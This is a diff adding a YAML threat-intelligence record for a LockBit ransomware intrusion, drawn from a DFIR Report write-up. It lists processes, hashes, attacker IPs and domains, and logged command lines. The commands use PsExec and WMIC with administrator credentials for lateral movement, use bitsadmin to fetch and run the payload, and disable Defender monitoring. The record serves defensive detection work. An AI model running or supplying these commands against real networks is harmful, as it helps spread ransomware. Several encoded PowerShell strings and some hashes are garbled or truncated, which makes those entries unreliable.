@@ -1,0 +1,109 @@
+description: The report details a LockBit ransomware deployment leveraging PSExec,
+  WMI, and modified batch scripts for lateral movement and payload execution.
+date: '2025-01-27'
+attribution: LockBit
+malware_families:
+- LockBit
+TTPs:
+  processs:
+  - cmd.exe
+  - powershell.exe
+  - PsExec.exe
+  - PSEXESVC.exe
+  - wmiprvse.exe
+  - wmic.exe
+  - bitsadmin.exe
+  - svchosts.exe
+  - dfg.exe
+  - svc.dll
+  - Veeam-Get-Creds.ps1
+  - svcmc.dll
+  - setup_wm.exe
+  - check.exe
+  - ds.exe
+  - EXE1.bat
+  - COPY.bat
+  - WMI.bat
+  - RDP.bat
+  - WMI1.bat
+  - COPY1.bat
+  - DEF.bat
+  - EXE.bat
+  commandline:
+  - '"%PUBLIC%\\Music\\share$\\COPY.bat"  PsExec.exe /accepteula -d \\REDACTED -u
+    "domain.local\\Administrator" -p "REDACTED" cmd /c COPY /Y "\\REDACTED\\share$\\ds.exe"
+    "%PUBLIC%\\Music"'
+  - '"C:\\share$\\EXE1.bat"  C:\\share$\\PsExec.exe -d @C:\\share$\\comps1.txt -u
+    "domain.local\\Administrator" -p "REDACTED" cmd /c %WINDIR%\\temp\\ds.exe -pass
+    REDACTED'
+  - '"C:\\share$\\WMI1.bat"  wmic /node:@C:\\share$\\comps1.txt /user:"domain.local\\Administrator"
+    /password:"REDACTED" process call create "cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\\share$\\ds.exe
+    %APPDATA%\\ds.exe&%APPDATA%\\ds.exe -pass REDACTED"'
+  - cmd.exe /c COPY /Y "\\REDACTED\\share$\\ds.exe" "%PUBLIC%\\Music"
+  - bitsadmin /transfer ds \\\\REDACTED\\share$\\ds.exe %APPDATA%\\ds.exe
+  - '"%WINDIR%\\system32\\cmd.exe /c ""%PUBLIC%\\Music\\share$\\COPY.bat""  PsExec.exe
+    /accepteula -d \\REDACTED -u "domain.local\\Administrator" -p "REDACTED" cmd /c
+    COPY /Y "\\REDACTED\\share$\\ds.exe" "%PUBLIC%\\Music"'
+  - PSEXESVC.exe  "cmd" /c COPY /Y "\\REDACTED\\share$\\ds.exe" "%PUBLIC%\\Music"
+  - '"%WINDIR%\\system32\\cmd.exe /c ""C:\\share$\\EXE1.bat""'
+  - wmic /node:@C:\\share$\\comps1.txt /user:"domain.local\\Administrator" /password:"REDACTED"
+    process call create "cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\\share$\\ds.exe
+    %APPDATA%\\ds.exe&%APPDATA%\\ds.exe -pass REDACTED"
+  - wmiprvse.exe  cmd.exe /c bitsadmin /transfer ds \\\\REDACTED\\share$\\ds.exe %APPDATA%\\ds.exe
+  - '"%PUBLIC%\\Music\\share$\\COPY.bat"  PsExec.exe /accepteula -d \\REDACTED -u
+    "domain.local\\Administrator" -p "REDACTED" cmd /c COPY /Y "\\REDACTED\\share$\\ds.exe"
+    "%WINDIR%\\temp"'
+  - cmd /c COPY /Y "\\REDACTED\\share$\\ds.exe" "%WINDIR%\\temp"
+  - '"%APPDATA%\\ds.exe -pass REDACTED"'
+  powershell:
+  - Set-MpPreference -DisableRealtimeMonitoring $true
+  - JABZADBATGB] AHCALQBPAGI AagB1AGMAIAAGAEKATWAUAEBAZQBTAGBACGBSAFMAAABYAGUAYQBTACGAL
+    ABDAEMAbWBUAHY AZQBYAHQAXQA6ADOARGBYAGBADQBCAGEACH.povershell
+  - JABZADBATGB] AHCALQBPAGI AagB1AGNAAAAGAEKATWAUAEBAZQBTAGBACGBSAFMAAABYAGUAYQBTACGAL
+    ABDAEMAbWBUAHY AZQBYAHQAXQAGADOARBYAGBABQBCAGEACH. .povershell
+  - JABzADOATgB1AHCALQBPAGIAagBlAGMAJAAGAEKATWAUAE@AZQBtAGBACGBS...
+  registry_keys: []
+  network_connections:
+  - port: 443
+    destination: 31.172.83[.]162
+  - destination: user.compdatasystems[.]com
+  - destination: compdatasystems[.]com
+  - port: 443
+    destination: retailadvertisingservices[.]com
+  - port: 30001
+    destination: 91[.]142[.]74[.]28
+  - port: 30001
+    destination: 195[.]2.70[.]38
+  - port: 30001
+    destination: 38[.]180[.]61[.]247
+  file_modifications: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 6505b488d0c7f3eaee66e3db103d7b05
+  - bf2b396b8fb0b1de27678aab877b6f17
+  - 7546d1c5
+  - b4ad5df385ee964fe9a800f2cdaa0362
+  - 6c8e8811ddb171f8e821876373335e63
+  - 671b967eb2bc04a0cd892ca225eb5034
+  - ab1777107d9996e647d43d1194922b81
+  - bf2b396b8fb0b1de27678aab877b6f17
+  - 7546d1c5
+  - b4ad5df385ee964fe9a800f2cdaa0362
+  - 6c8e8811ddb171f8e821876373335e63
+  ips:
+  - 31.172.83[.]162
+  - 91[.]142[.]74[.]28
+  - 195[.]2.70[.]38
+  - 38[.]180[.]61[.]247
+  domains:
+  - accessservicesonline[.]com
+  - user.compdatasystems[.]com
+  - compdatasystems[.]com
+  - retailadvertisingservices[.]com
+  urls:
+  - https://accessservicesonline[.]com/setup_wm.exe
+reference: https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/
+file_creation_date: May 14, 2025
